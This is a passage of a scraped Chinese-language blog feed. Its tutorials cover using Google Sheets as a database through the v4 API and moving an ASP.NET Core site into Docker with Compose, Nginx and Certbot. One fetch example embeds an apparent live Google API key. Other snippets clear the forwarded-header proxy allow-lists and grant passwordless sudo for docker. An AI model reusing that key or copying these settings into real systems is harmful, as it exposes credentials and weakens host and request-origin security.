Key 1. GCP 新增新專案 沒有專案的才需要這步，進到 Google Cloud Platform 的頁面按下新增專案，取好專案名稱後即可新增。\n2. 開通 Google Sheets API 功能 有了 GCP 的專案後，進到 API 程式庫：https://console.cloud.google.com/apis/library?hl=zh-TW\n搜尋欄中搜尋「sheet」，會看到一項「Google Sheets API」：\n點擊後按下「啟用」，專案就會開通 Google Sheets API 的功能：\n啟用完成，頁面會回到 GCP 的頁面，可以看到上面一條訊息提醒要有憑證才能使用 API：\n直接點擊「建立憑證」，或是打開網址：https://console.cloud.google.com/apis/credentials/wizard?hl=zh-TW\n3. 建立憑證 建立憑證的第一步要先做一些選擇：\n「選取 API」，選擇「Google Sheets API」。\n「您需要存取什麼資料？」，這段看了 說明文件 也看不太懂使用的情境，選擇「應用程式資料」就可以。\n「您打算將這個 API 與 Compute Engine、Kubernetes Engine、App Engine 或 Cloud Functions 搭配使用嗎？」，本篇只是為了要能夠取得 Google Sheets 中的資料，並不會用到上述的功能，選擇「不，我不會使用任何一項憑證」。\n接著按「下一步」。\n下一步是填寫我們建立這個帳戶的資料，填寫成我們之後回頭來看時，看得懂要做什麼的資訊就可以：\n填寫完後按下「建立並繼續」。\n後面二項是選填，不用設定也沒關係，按下「完成」。\n4. 建立 API 金鑰 上一步完成後，頁面會回到 憑證的頁面，點擊上方的「建立憑證」，選擇「API 金鑰」：\n幾秒後，就會看見跳出一個小視窗，上面寫了「您的 API 金鑰」，這個金鑰也就是我們要取 Google Sheets 時後面要附上的：\n視窗上面也提醒了，為了怕金鑰被外人拿到也可以用，我們必須要對這組金鑰加上限制，點擊「限制金鑰」就會進入設定的頁面。\n建議一定要設定限制，本篇的 Demo 有限制只有在 Demo 頁下才有效，而且也只能用 Google Sheets API 的功能。\n有了 API 金鑰，接著就是用新的 URL 去執行 GET。\nGoogle Sheets URL V4 版的 URL 規則如下：\n1 https://sheets.googleapis.com/v4/spreadsheets/{表單id}/values/{sheet名稱}?alt=json\u0026amp;key={API金鑰} {表單id}：表單的網址上就可以看到。 {sheet名稱}：就是每一張試算表的名稱，預設會是叫「工作表1」，這邊有測試過，有支援中文。 {API金鑰}：就是上一段我們從 GCP 上取得的金鑰。 我們用一個簡單的 fetch 來取：\n1 2 3 4 5 fetch(\u0026#39;https://sheets.googleapis.com/v4/spreadsheets/1-vTT5LVlscvExPjqJHrhmlO2ZMM-93McoP-yXT8gyOU/values/工作表1?alt=json\u0026amp;key=AIzaSyAVlwHA4EQx7AWjK1QsT87shL37vhKWrl4\u0026#39;) .then(res =\u0026gt; res.json()) .then(res =\u0026gt; { console.log(res) }) Console 上會看到回來的資料如下：\n回來資料的格式，所有資料都收在 values 裡，Google Sheets 上的每一列會成為一個一個的陣列。\n相關連結 附上本篇的相關連結：\n網站成果 Google Sheet 網站原始碼 Github 空間 ","date":"2022-12-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52550876753_d803ddfa87_o.jpg","permalink":"https://wayneblog.ga/2022-12-10/use-google-sheet-as-db/","title":"如何用 Google Sheets / Excel 當作資料庫？"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n前言 發表 Docker 筆記以來，一直有網友提醒應改用 Kubernetes (K8S)，關於這點在前篇文章已經提過，用 Docker / Docker-Compose 玩玩小網站還 OK，一旦涉及高可用性如備援、負載平衡，若不依賴現成管理架構，維運操作將複雜到會咬人。而 Kubernetes 正是目前容器管理框架的主流業界標準，尤其如打算將容器直接部署到雲端廠商(Azure、AWS、Google GCP)，不會 Kubernetes 更是寸步難行。故在次聲明以正視聽，在企業環境如需考量高可用性、負載平衡或想直接部署到廠商雲端，一般不會用 Docker-Compose 而會採用 Kubernetes，請大家注意。\n這篇筆記是我將部落格網站移入 Docker 容器的經驗分享，將記錄 Miniblog.Core ASP.NET Core 網站搬進 Docker 過程遇到的一些眉角。\nReverse Proxy 問題 由於我打算在同一機器上共享對外 IP 跑多個網站，因此採行前一篇筆記所說的「以 Compose 組合網站與 DB，網站對映 Host IP/Port，Nginx 另跑容器導向各網站 Port」策略。\n目錄對應 部落格網站有一些執行期間更新的內容，包含 NLog Log 檔、文章圖檔、SQLitｅ 資料庫等，這些內容不適合放在容器裡，故都需設 Volume 對映到 Host OS 的實際檔案，如此容器可任意刪除重建及升級，管理運用較方便。\n時區問題 踩了雷才知道：Docker 容器內的時區跟 Host OS 是脫鉤的。即便本機已設好定為台北時區，Docker 容器預設為 UTC+0 時區，有兩種做法：\n在 docker-compose.yml 中加註環境參數 TZ 新增 Volume 對映 /etc/localtime:/etc/localtime:ro，要求容器以 Host OS 的時區為準 第一種做法遇到以 Alpine Linux 版 Image 建的容器需要額外裝套件，故對映 /etc/localtime 較單純。\n參考：設定 Docker Container 與 Host 相同時區的方法\n取得真實來源 IP 問題 Reverse Proxy 來源 IP 在 ASP.NET Core + Nginx on CentOS 安裝筆記 提過，當 ASP.NET Core 架設在 Reverse Proxy 後方，直接看到的是 Reverse Proxy 的 IP，要得到真實來源 IP，在 Nginx config 需加註 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for，透過 HTTP Header 傳遞內容。而 ASP.NET Core 程式也需修改：\n1 2 3 4 5 6 7 public void Configure(IApplicationBuilder app, IHostingEnvironment env) { app.UseForwardedHeaders(new ForwardedHeadersOptions { ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto }); } 不過若 ASP.NET Core 運行於容器，綁定的 IP 不是 127.0.0.1 而是隔離網段 172.1x.0.x IP，此行為打破 UseForwardedHeaders 假設 Request 來自 localhost 的前題，就算設了 ForwardedHeaders， IHttpContextAccessor.HttpContext.Connection.RemoteIpAddress 讀到的仍是 172.1x.0.1 (隔離網段的 Gateway IP)。\n由 ASP.NET Core 的原始碼，檢查規則為若 ForwardedHeadersOptions.KnownNetworks 或 ForwardedHeadersOptions.KnownProxies 有設定，來源 IP 必須要是 KnownNetworks 或 KnownProxies 才會認定請求為 Proxy 轉傳。而 KnownNetworks 及 KnownProxies 預設只有本機 IP。\n1 2 3 4 5 6 7 8 9 10 11 12 13 // ... /// \u0026lt;summary\u0026gt; /// Addresses of known proxies to accept forwarded headers from. /// \u0026lt;/summary\u0026gt; public IList\u0026lt;IPAddress\u0026gt; KnownProxies { get; } = new List\u0026lt;IPAddress\u0026gt;() { IPAddress.IPv6Loopback }; /// \u0026lt;summary\u0026gt; /// Address ranges of known proxies to accept forwarded headers from. /// \u0026lt;/summary\u0026gt; public IList\u0026lt;IPNetwork\u0026gt; KnownNetworks { get; } = new List\u0026lt;IPNetwork\u0026gt;() { new IPNetwork(IPAddress.Loopback, 8) }; // ... 解決方法有兩種，一種是將 172.x.0.0 加入 ForwardedHeadersOptions.KnownNetworks，但網段為 Docker 自由調配，最好寫成自動偵測不宜寫死。\n另一個解法是將 KnownNetworks 與 KnownProxies 都清空，一般有來源 IP 被偽造的風險，但我們 ASP.NET Core 網站架構 Nginx Reverse Proxy 是唯一的入口，故我將其視為可接受做法：\n1 2 3 4 5 6 7 var forwardingOptions = new ForwardedHeadersOptions() { ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto }; forwardingOptions.KnownNetworks.Clear(); //its loopback by default forwardingOptions.KnownProxies.Clear(); app.UseForwardedHeaders(forwardingOptions); 參考：\n记录Docker部署asp.net core应用时使用反向代理的坑 IIS Reverse Proxy 後 RemoteIpAddress 取值錯誤 Stackoverlow 討論 Nginx 內容壓縮問題 跑了一陣子才發現，我用的 Nginx + Certbot 容器的 Nginx 設定檔 /etc/nginx/nginx.conf 預設未開啟 GZIP 壓縮。\n我的解法是新增 Volume 對映將 /etc/nginx/nginx.conf 對應到 Host /etc/nginx/nginx.conf，並修改增加 gzip 那段內容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 user nginx; worker_processes 1; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; gzip on; gzip_min_length 1000; gzip_buffers 4 16k; gzip_comp_level 5; gzip_types text/plain application/x-javascript text/css application/xml text/javascript; include /etc/nginx/conf.d/*.conf; } Nginx 壓縮設定的意義可參考官方文件\n","date":"2022-12-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-09/dotnet-core-docker-note-4/","title":"ASP.NET Core Docker 筆記 4 - ASP.NET Core 網站容器化經驗分享"},{"content":" 參考網站\n前言 前篇文章介紹過使用 Docker Compose 設定關聯容器(Web、DB、Reverse Proxy)組成系統，容器被隔離在專用網段(Compose 自動建立的 Bridge)，並可透過容器名稱彼此溝通，Compose 也確保相關服務一起啟動一起關閉，是用多個容器建構系統最簡便的做法。\n註：關於容器管理 Kubernetes，K8S 提供更強大的功能，支援 Cluster 高可用架構 (單一容器、主機掛掉系統不會死)，為當今在雲端掛載容器以及中大型企業實做容器架構的主流，K8S 無疑可取代 Docker Compose，但其複雜性較高。 目前我在單一 Linux 機跑 Docker 還用不到牛刀(雖然有單機版 Minikube 可用)，未來若要將 Docker 應用於工作，K8S 已成必要技能。\n用 Docker Compose 組合容器建立服務看似完美，但應用在 Reverse Proxy (Nginx) 時需要額外考量。\n我打算在同一台 Linux 上跑多個網站，對外用同一個 IP，再依 HTTP Request 的 Host 標頭導向不同網站。\n舉例 舉個例子：假設 Linux 的對外 IP 是 123.123.123.123，我申請兩個 DNS 名稱 web1.xxx.com.tw、web2.xxx.com.tw 都指向 123.123.123.123。\n使用者用 http://web1.xxx.com.tw 連上 123.123.123.123 的 80 Port 時，Reverse Proxy 導向 Web1 網站；用 http://web2.xxx.com.tw 時連線時則導向 Web2 網站。由於對外靜態 IP 為珍貴資源，多網站透過 Host 共用 IP 是節省成本的常見做法。\n上述以 HTTP Host 名稱導向的做法，若用 Docker Compose 將網站連同 Reverse Proxy 包在一起，就可能出問題。\n例如：某 Host OS 跑兩個網站，若各自用 Docker Compose 連同 Nginx 一起包進去，網站 A 由 Web-A + MySQL-A + Nginx-A 組成，網站 B 由 Web-B + MySQL-B + Nginx-B 組成，二者跑在自己的專屬網段，僅 Nginx-A 跟 Nginx-B 對映到 Host OS IP 的 80 Port\u0026hellip; 哦哦，衝突出現了，Nginx-A 與 Nginx-B 都需對映 Host IP 的 80 Port，但 Host OS 的 80 Port 只允許被一個程序使用。\n解決方式 有幾個解決方向：\nNginx-A 與 Nginx-B 各自對應到主機不同 Port，更前端再掛一台 Nginx 聽 80 Port，依 Host Name 導向到 Nginx-A 與 Nginx- B，如此 Nginx-A 與 Nginx-B 的角色顯得多餘，多了一次轉接但未看到明顯效益，徒增複雜性又耗損效能。\n將兩個系統包成一個大 Docker Compose，Web-A + MySQL-A + Web-B + MySQL-B + Nginx，共用 Nginx 可避免 Port 80 繫結衝突，但將不相關系統綁架成一團，被迫一起啟動一起停止挺鳥的，更不用提一旦加跑新服務就要改 Docker Compose，我覺得不行。\n將 Nginx 從 Docker Compose 抽離，讓 Web-A 與 Web-B 對映到 Host IP 的不同 Port，整個 Host OS 只跑一份 Nginx 聽 80 Port，依 Host Name 分派給網站 A 或網站 B。也就是用 Docker Compose 執行三個容器：\nWeb-A + MySQL-A Web-B + MySQL-B Ngnix 3 是我認為較可行且有效率的做法。\nNginx 包容器的做法在第一篇筆記已提過，這次我們將重點放在整合 Certbot 及 docker-compose.yml 定義。\n原本想抓 Nginx 的 Docker Image 自行加裝 certbot 實現自動安裝與更新 Let\u0026rsquo;s Encrypt SSL 憑證。\n用 Docker 的好處是資源豐富，很快在網路上找到現成解決方案，超級好用的全自動化 Nginx + Certbot -\u0026gt; staticfloat/nginx-certbot。\nstaticfloat/nginx-certbot staticfloat/nginx-certbot\n使用方法很簡單，在 /etc/nginx/conf.d 放一個 certbot.conf 接受 80 Port 流量，只用於接收 Let\u0026rsquo;s Encrypt 的 /.well-known/acme-challenge 要求導向 Certbot 完成自動驗證，其餘則一律導向 HTTPS：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 server { # Listen on plain old HTTP listen 80 default_server; # Pass this particular URL off to certbot, to authenticate HTTPS certificates location \u0026#39;/.well-known/acme-challenge\u0026#39; { default_type \u0026#34;text/plain\u0026#34;; proxy_pass http://localhost:1337; } # Everything else gets shunted over to HTTPS location / { return 301 https://$http_host$request_uri; } } 接著在 /etc/nginx/conf.d 為每個網站新增一個 someweb.conf 承接 HTTPS 請求。server_name 註明該網站綁定的 Host 名稱(DNS 名稱)，ssl_certificate、ssl_certficate_key 則指向 /etc/letsencrypt/live/DNS名稱 的 fullchain.pem 及 private.pem，這兩個檔案不需事先準備，Certbot 會自動產生，至於 proxy_* 相關設定比照先前介紹過的做法。完整範例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 server { listen 443 ssl; server_name blog.darkthread.net; ssl_certificate /etc/letsencrypt/live/blog.darkthread.net/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.darkthread.net/privkey.pem; location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 這個 Docker Image 有一段精巧設計，它在啟動時會主動掃瞄 /etc/nginx/conf.d 下的 config，一旦偵測缺少 /etc/letsencrypt/live/*/fullchain.pem 就連上 Let\u0026rsquo;s Encrypt 網站進行驗證下載 SSL 憑證，另外還設了每週一次的排程，憑證到期前會自動更新，一氣喝成，全不沾手，貼心到我想起立鼓掌。\n若對它的運作原理有興趣，Github 有原始碼可以參考。\n為了瞭解原理，我是依著 Github 原始碼自己跑 Dockerfile 製作 Nginx + Certbot 的 Image，如果嫌麻煩，直接從 Docker Hub 下載也成。\n以下是我的 Nginx docker-compose.yml：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 version: \u0026#34;3\u0026#34; services: nginx: image: nginx-certbot container_name: nginx ports: - 80:80 - 443:443 volumes: - /var/log/nginx:/var/log/nginx - /etc/nginx/conf.d:/etc/nginx/conf.d - /etc/letsencrypt:/etc/letsencrypt restart: always environment: - CERTBOT_EMAIL=your-email@mail.com network_mode: \u0026#34;host\u0026#34; 我設了三個 Volume 對映：\n/var/log/nginx：Log 檔 /etc/nginx/conf.d：設定檔 /etc/letsencrypt：用來存放 SSL 憑證 若為 SELinux 記得要 chcon -Rt 參考，另外 network_mode 指定 host 表示 Nginx 容器將直接使用 Host OS 網段，不另設 Bridge。\n參考：Docker Compose 鏈接外部容器的幾種方式\n就醬，Nginx Reverse Proxy 準備好了，下一篇來再來分享我將 ASP.NET Core 搬進 Docker 的經驗。\n","date":"2022-12-08T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-08/dotnet-core-docker-note-3/","title":"ASP.NET Core Docker 筆記 3 - 共用 Nginx 容器與 Certbot 整合"},{"content":" 參考網站\n參考網站\n上篇文章體驗過在 CentOS 用 Docker Container 分別跑 Nginx 跟 ASP.NET Core 網站，並建立 Reverse Proxy 關係，接著探討在實務上當需要多個 Container 協同運作時應如何規劃整合。\n一個系統常可再拆解成多個服務。以線上購物網站為例，就可能是由 ASP.NET Core 網站(Kestrel)、MySQL 資料庫、Reverse Proxy、金流 Gateway\u0026hellip; 等多個服務組成，若要以 Docker Container 實現，有幾種策略：\n策略 1. 全部裝在單一 Container 撰寫一個 Dockerfile，以 MySQL 資料資料庫為基底，在上面安裝 ASP.NET Core Runtime、Nginx 組裝合成獸。\n好處是一個 Container 搞定，高內聚低耦合，不會因相依服務沒配置好或未啟動而故障。但缺點挺明顯：\n某些 Container Image 為求輕巧作業系統層次的工具、程式庫很精簡(例如：Nginx Container 連 ping 都沒有)，只求目標程式能執行就好，要加裝其他軟體時要點技巧，得多花些心思。 全部綁在一起便失去動態調配的彈性，例如：當前端 Web 負載過高時，擴充不易。 當需要個別升級資料庫、ASP.NET Core 版本，或是想抽換服務組合時手續複雜，有違模組化精神。 2. 以個別 Container 執行，獨立控制 如同前篇文章的做法，ASP.NET Core 網站跑 Cotainer 繫結到 Host OS 的 5000 Port，用 Container 跑 MySQL，再用 Container 跑 Ngnix 繫結到 Host OS 80 Port，再設定 Reverse Proxy 規則。\nContainer 間串接配置全靠人工，系統管理員需協助哪個 Container 聽哪個 Port，確保彼此不衝突。如此做有兩個缺點：\n相依服務的啟動狀態未連動，需靠人為控制確保先啟動資料庫 Container 再啟動網站 Container 的順序。 若 Host OS 跑多個系統都用到 MySQL，系統管理員需協調 TCP Port 不衝突，Docker 的 Bridge (橋接器)隔離網段機制全無用武之地。 3. 以個別 Container 執行，但使用 Docker Compose 關聯 為滿足多 Container 協同作業需求，Docker Compose 應運而生。\nDocker Compose 定義了一套宣告語法(採用 YAML 格式)，在其中定義各服務 Container 的啟動參數、與 Host OS Port 對映、隸屬 Bridge 網段、Volume 資料夾/檔案對應等等。\nDocker Compose 會自動為 Container 建立隔離網段並設好名稱解析，讓 Container 使用容器名稱解析成 IP 找到其他 Container，因此設定連線字串或 URL 時便可寫成 httq://myweb:5000、mongodb://mydb，清楚又方便。\n最重要是透過 docker-compose up/down 指令可以一次啟動或停用相關服務，Docker Compose 還會依據相依 depends_on 指定關聯先啟動 DB 再啟動 Web，先關閉 Web 再關閉 DB，便利性讓人工操作望塵莫及。\n參考：Docker Compose 初步閱讀與學習記錄\n實例 針對上述三種做法，以 ASP.NET Core + Ngninx 為題，對映到以下實例：\n1. 安裝成單一 Container 以 ASP.NET Core Image 為基底，安裝 Nginx，設定 nginx.conf，複製 ASP.NET Core 網站檔案並設定 service nginx start 及 dotnet /app/web.dll 分別啟動 Nginx 及 Kestrel。\n細節做法可參考這篇文章：Nginx Reverse Proxy to ASP.NET Core – Same Docker Container\n不過，該文用的 ASP.NET Core 版本偏舊，若為 ASP.NET Core 2.1 包成 Docker Container 的做法請參考前文\n2. ASP.NET Core、Nginx 各自跑 Container 就是我們在前篇文章採行的方式，但有一點要補充，除了直接對映到 Host OS IP 的 TCP Port，也可考慮自訂 Bridge，讓 Container 在隔離網段內溝通，例如：ASP.NET Core 的 5000 Port 只有 Nginx 看得到，從 Host OS 無法存取，如此可避免網路介面(網站、資料庫\u0026hellip;)外露到 Host OS，減少被攻擊的風險，這部分後面再找時間介紹。\n3. 使用 Docker Compose 串連 ASP.NET Core 與 Nginx 各有自己的容器，使用 Docker Compose 組合串連，一次啟動兩個服務。\n細節做法可參考這篇文章：Nginx Reverse Proxy to ASP.NET Core – Separate Docker Containers\n綜合以上分析，Docker Compose 無疑是整合關聯 Container 較佳的方式。\n練習 光說不練是假把式，寫技術文沒實作感覺怪怪的，來個 Docker Compose 練習好了。手邊沒有 ASP.NET Core + DB Server 的範例，就用 Docker 可以找到的 Image 當題材(也方便大家實地驗證)，試試用 Container 跑 Wekan 看板系統。Wekan 在 Node.js 執行，另外需要 MongoDB，這個練習會用 Docker Compose 組合兩個 Container 架設看板網站。\n開始前，記得先安裝 Docker Compose，如果發生 sudo docker-compose 找不到指令，要再加上 sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose 參考。\n要使用 Docker Compose 很簡單，說穿了就是將 Container 設定寫成 docker-compose.yml，寫好寫對再呼叫 docker-compose up -d 即大功告成。以 Wekan 為例，docker-compose.yml 如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 version: \u0026#39;3\u0026#39; services: wekan: image: wekanteam/wekan:latest depends_on: - wekandb environment: - MONGO_URL=mongodb://wekandb/wekan - ROOT_URL=http://localhost:80 ports: - 80:8080 wekandb: image: mongo:3.2.14 volumes: - /var/www/wekan/db:/data/db 在這個 YAML 裡，我定義了兩個 Service Container，分別叫 wekan 及 wekandb。\nWekan Container Image 來自 wekanteam/wekan 最新版，depends_on 宣告 wekan 依賴 wekandb，故 Docker Compose 會先啟動 wekandb 再啟動 wekan。\nMONGO_URL、ROOTL_URL 為環境變數，其中 MONGO_URL 寫成 mongodb://wekandb/wekan，docker-compose.yml 所定義的各 Container 預設隸屬同一個 Bridge 網段，彼此可用機器名稱解析。\nWekan 網站在 Container 掛在 8080 Port，透過 ports 80:8080 會將其對映到 Host IP 80 Port。\nwekandb Container 則以 Mongo DB Container Image 為基底，資料庫檔案以 Volume 方式對映到 Host OS /var/www/wekan/db 資料夾。\n這裡補充一個眉角，由於 SELinux 資安管控較嚴，在 CentOS/REHL/Fedora 版 Linux 上 Docker Container 讀取 Volume 對映資料夾可能會出現 permission denied 錯誤，需對該資料夾執行 chcon -Rt svirt\\_sandbox\\_file\\_t /var/www/wekan/db 調整權限，或在目錄名稱後方加上 :Z 由 Docker 自動執行。\n參考：Using Volumes with Docker can Cause Problems with SELinux\n寫好 docker-compose.yml，執行 sudo docker-compose up -d，Docker Compose 依序帶起 weknadb、wekan 兩個容器，Wekan 看板已在 Host OS 80 Port 運行成功。\n最後補充一點，前面提到 Docker Compose 會為整組 Container 建立專屬 Bridge，上圖一開始的 Create network \u0026ldquo;wekan_default\u0026rdquo; with the default driver 訊息就是證明。\n執行 docker network ls，可看到 wekan_default 是個 bridge，執行 docker inspect wekan_default 則可進一步看到這個網段為 172.18..，而兩個 Container 的 IP 分別為 172.28.0.3 及 172.28.0.2。\nDocker Compose 非常適合用來組裝 Web、DB 等多個 Container 構建系統，但我發現針對 Nginx 時有些額外考量，這部分留待下集分解。\n","date":"2022-12-07T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-07/dotnet-core-docker-note-2/","title":"ASP.NET Core Docker 筆記 2 - 組合容器建構系統"},{"content":" 參考網站\n參考網站\n前面研究過在 CentOS 安裝及設定 ASP.NET Core + Nginx，習得徒手在 CentOS 安裝部署伺服器的技能，依循 Roadmap 來到下一階段 - 學習使用 Docker 簡化部署。\n容器化及 Docker 這幾年熱到發燙，有些人甚至認為它已在軟體產業掀起一波革命。(我親身體驗的感想也是：Wow! 難怪會爆紅) 此刻才起步已算遲了，但也不是沒有好處，晚起鳥兒有更多蟲可以吃，Docker 相關的文章資源多如牛毛，這裡便不多花篇幅贅述觀念與基本操作，只簡單整理我對 Docker 的理解。\nDocker 相關介紹 Container Container (容器)可以想成極度輕量化的虛擬機器(Virtual Machine)，用法及優點與 VM 相同，能在一台 Host OS 同時運行多個彼此隔離的應用程式環境，但差別在 Container 會共用底層 Host OS，相較 VM 需各跑一份 Guest OS 能省下可觀的記憶體、磁碟，因此 Container 多了啟動速度快，耗用資源少(與直接跑應用程式相去不遠)的優勢。\n一台 4GB RAM 的機器頂多跑 2 - 3 台 VM 就緊繃了，但執行數十上百個 Container 不是問題。\n2 Container 跟 VM 一樣具有很好的隔離效果，每個 Container 有自己的獨立作業環境(記憶體、磁碟空間、網路)，不會彼此干擾，不必擔心 Container A 改系統設定害 Container B 跑不起來，或是兩個 Container 互相搶奪 80 Port，拿到 Image 就一定能在自己的機器跑起來。\nContainer 在這方面的特性與 VM 完全相同，但因為不用包入作業系統，體積縮小許多，耗用記憶體也少，但便利性完全不減，取得 Container Image，靠一行指令幾秒內就能在機器把程式跑起來。\nDocker Hub Docker Hub 上有超過 10 萬個 Container Image，從 PHP、Node,js、Apache、MySQL、Mongo DB、Nginx、Redis、ASP.NET Core\u0026hellip; 幾乎想得到的都有，下指令自動下載 Image，幾秒鐘就裝好一台 DB、Web 伺服器，再下個指令又裝好第二台，不用擔心跟作業系統不相容、與其他軟體相衝、系統環境有誤導致安裝失敗，這就是 Docker 最迷人的所在。\n而我們也可將自己的專案網站做成 Image，交給測試人員測試，交付 OP 幾秒部署上線，也能將做好的 Image 上傳到 Docker Hub 與全世界分享。\nDocker Container Docker Container 起初是基於 Linux Container 技術，故在 Container 只能跑 Linux 平台應用程式，雖然在 Windows 也有 Docker for Windows，但背後是用 Hyper-V 跑 Linux 虛擬機執行 Docker Engine 再跑 Docker Container。\n後來微軟也依循相同概念發展出 Windows Container，並融入 Docker 體系，自此 Docker Container 開始有 Linux Container、Windows Container 之分，Windows Container 裡跑的就是不折不扣的 Windows 程式。\n參考：安裝 Docker 容器環境 - Windows Server 2016\n從此，在 Container 裡跑 ASP.NET WebForm不再是夢。\nWindows Container Windows Container 問市後，ASP.NET Core 程式容器化有 Linux Container 與 Windows Container 兩種選擇。\n基於 Linux Container 資源數量上的優勢，加上耗用資源較少，軟硬體成本低，我選擇 Linux Container。\n雖然 Container 間共用底層作業系統，Docker Engine 為容器中的應用程式提供隔離不受干擾的空間（記憶體、檔案系統、網路 Port）。\n例如：容器 A 寫入 /etc/aaa/default.conf 不影響容器 B /etc/aaa/default.conf 的內容、容器 A 與容器 B 都繫結到 80 Port 也不會衝突。\n先前文章提過將 Kestrel 轉為 Linux 服務、設定 www-data 執行權限\u0026hellip; 等步驟，改用 Docker 後簡單很多，生命週期由 Docker 控制，在容器內部權限一律為 root 不需額外規劃權限，直接跑 dotnet WebApp.dll 聽 5000 Port 就好。\n參考資料：\n10個Q\u0026amp;A快速認識Docker 《Docker —— 從入門到實踐­》正體中文版 Docker 入门教程 by 阮一峰 練習 Docker 安裝與基本操作的參考資料很多，這裡不多介紹，直接來幾個練習暖身：在 CentOS 上用 Docker 下載現成 Conatiner Image 執行 Nginx 伺服器，再用預設專案範本建立 ASP.NET Core 網站並包進 Container 執行。最後將二者串接在一起，使用 Nginx 做為 ASP.NET Core 網站的 Reverse Proxy。\n執行 Nginx Container 執行 Nginx Container\n1 sudo docker run --name mynginx -d -p 80:80 --rm nginx 不誇張，真的只要這行 Nginx 就好了。\n-d：把 Container 丟到背景執行不要佔用命令列視窗 -p 80:80：表示將 Container 的 80 Port 對應到 Host OS 的 80 Port --rm：表示 Container 停止時自動刪除。 開個 Chrome 連上 Host OS 的 80 Port，Nginx 已經準備就緒！\n註：docker 指令需繫結 Unix Socket，必須以 SuperUser 權限執行，將使用者加入 Docker 群組可省去每次加 sudo 的麻煩。參考：Manage Docker as a non-root user\n1 2 sudo groupadd docker sudo usermod -aG docker $USER 但這招在 CentOS/Fedora/RHEL 不管用!，但有替代方案：在 /etc/sudoers 加入 yourUserAccount ALL=(ALL) NOPASSWD: /usr/bin/docker 開放 sudo docker 時不用敲密碼，再用 alias docker=\u0026quot;sudo /usr/bin/docker\u0026quot; 建立同義詞，也可做到不必 sudo 敲密碼跑 docker 指令。\n將 ASP.NET Core 專案包進 Container 將 ASP.NET Core 專案包進 Container 使用 .NET Core CLI 建立 MVC 專案，修改 Startup.cs 取消 app.UseHttpsRedirection()，以 Kestrel 執行 ASP.NET Core 網站。\n1 2 3 4 dotnet new mvc sed -i -e \u0026#39;s/app.UseHttps/\\/\\/app.UseHttps/\u0026#39; Startup.cs dotnet publish dotnet bin/Debug/netcoreapp2.1/web.dll 由於 5000 Port 預設不對外開放，懶得開防火牆，在本機用 curl httq://localhost:5000 驗證網站運行中。\n驗證程式可執行後，寫個 Dockerfile 腳本將程式封裝成 Docker Image，這部分細節可參考保哥的文章：如何將 ASP.NET Core 2.1 網站部署到 Docker 容器中。\n在實務環境可以設計成全自動化測試流程，到版控抓原始碼放進內含 .NET Core SDK 的 Container 編譯，將結果包成只有 .NET Core Runtime 的 Container Image，用它建立 Container 進行 E2E 測試，一切自動化。這裡為求簡便，我選擇用只有 Runtime 的 Container Image 當成基底，將在 Host OS 編譯好的檔案複製到 Container /app 目錄，Dockerfile 內容如下：\n1 2 3 4 FROM microsoft/dotnet:2.1-aspnetcore-runtime WORKDIR /app COPY ./bin/Debug/netcoreapp2.1 ./ ENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;web.dll\u0026#34;] 做好 Dockerfile 後執行 docker build，Docker 會從 Docker Hub 下載 microsoft/dotnet:2.1-aspnetcore-runtime (microsoft/dotnet 是 Image 名稱，同一 Image 常有多種版本可選擇，:2.1-aspnetcore-runtime 是標籤可用來指定版本)，-t 參數指定 Image 名稱為 testapp。\nContainer Image 做好後接著用 docker run -d --rm --name myapp -p 5000:80 testapp 用剛做好的 Image 建立 Container，ASP.NET Core 專案在 Container 執行時，預設聽 80 Port，故我們用 -p 5000:80 將 Container 的 80 Port 導向 Host OS 的 5000 Port。用 curl 驗證網站運行中。\n使用 docker images 及 docker ps 我們可以看到剛才建立的 Image testapp 及 Container myapp：\n將 Nginx 設成 ASP.NET Core 網站的 Reverse Proxy 至此，我們做了兩個 Container，myginx 聽 Host OS 80 Port，myapp 聽 Host OS 的 5000 Port，下一步要將 Nginx 設成 ASP.NET Core 網站的 Reverse Proxy。\n做法跟先前文章介紹過的概念差不多，為求簡便我們直接修改 conf.d/default.conf 將進入 80 Port 的請求導向 5000 Port。(正規做法建議一個網站開一個 conf 檔) Container 的檔案系統是隔離的，將設定檔保存在 Container 裡不是好主意 - 除非每次修改設定存檔就重新產生 Image 並要求未來一律改用新版 Image 建立 Container，否則一旦 Conatiner 被刪除，設定就會消失。同樣問題也會發生在資料庫檔、Log 檔等執行期間要動態更新的內容，這類檔案保存在 Host OS 檔案系統上比較合理，程式換版換了 Container Image 資料才不受影響。Docker 靠 Volume 解決資料保存及共用需求，docker run 有個 -v host-path:container-path 可將 Host OS 